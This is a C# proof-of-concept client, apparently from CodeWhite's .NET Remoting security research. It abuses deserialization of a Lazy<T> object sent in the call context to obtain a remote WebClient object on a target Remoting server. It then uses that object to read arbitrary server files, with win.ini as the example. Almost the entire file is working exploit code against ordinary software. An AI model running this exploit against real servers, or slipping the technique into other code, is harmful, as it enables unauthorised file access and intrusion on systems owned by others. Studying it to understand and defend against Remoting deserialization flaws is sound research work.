using System;
using System.Net;
using System.Runtime.Remoting;
using System.IO;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.Remoting.Messaging;
using CodeWhite.Remoting.Shared;

namespace CodeWhite.Remoting.RemotingClient_MBRO_Lazy
{
    internal class Program
    {
        static readonly string ASSEMBLY_LOCATION = Assembly.GetExecutingAssembly().Location;

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.Error.WriteLine($"usage: {Path.GetFileName(ASSEMBLY_LOCATION)} objUrl fileUrl");
                Console.Error.WriteLine();
                Console.Error.WriteLine("example:");
                Console.Error.WriteLine($@"  {Path.GetFileName(ASSEMBLY_LOCATION)} tcp://127.0.0.1:12345/DummyService C:\Windows\win.ini");
                Environment.Exit(-1);
            }

            Uri objUrl = new Uri(args[0]);
            Uri fileUrl = new Uri(args[1]);

            RemotingConfiguration.Configure($"{Assembly.GetExecutingAssembly().Location}.config");

            // retrieve remote WebClient
            var mbro = GetRemoteMarshalByRefObjectInstance<WebClient>(objUrl);

            // print info
            Utils.PrintInfo(mbro);

            // use remote `WebClient`
            WebClient remoteWebClient = (WebClient)mbro;
            Console.WriteLine(remoteWebClient.DownloadString(fileUrl));
        }

        private static T GetRemoteMarshalByRefObjectInstance<T>(Uri objUrl) where T : MarshalByRefObject
        {
            const string key = "MBRO";
            var payload = new UniversalMarshal("mscorlib", typeof(Lazy<T>).FullName);
            var logicalCallContextData = new Dictionary<string, object>()
            {
                { key, payload }
            };
            var methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);
            var lazy = (Lazy<T>)methodReturnMessage.LogicalCallContext.GetData(key);
            return (T)lazy.GetType().GetProperty("Value").GetValue(lazy, null);
        }
    }
}
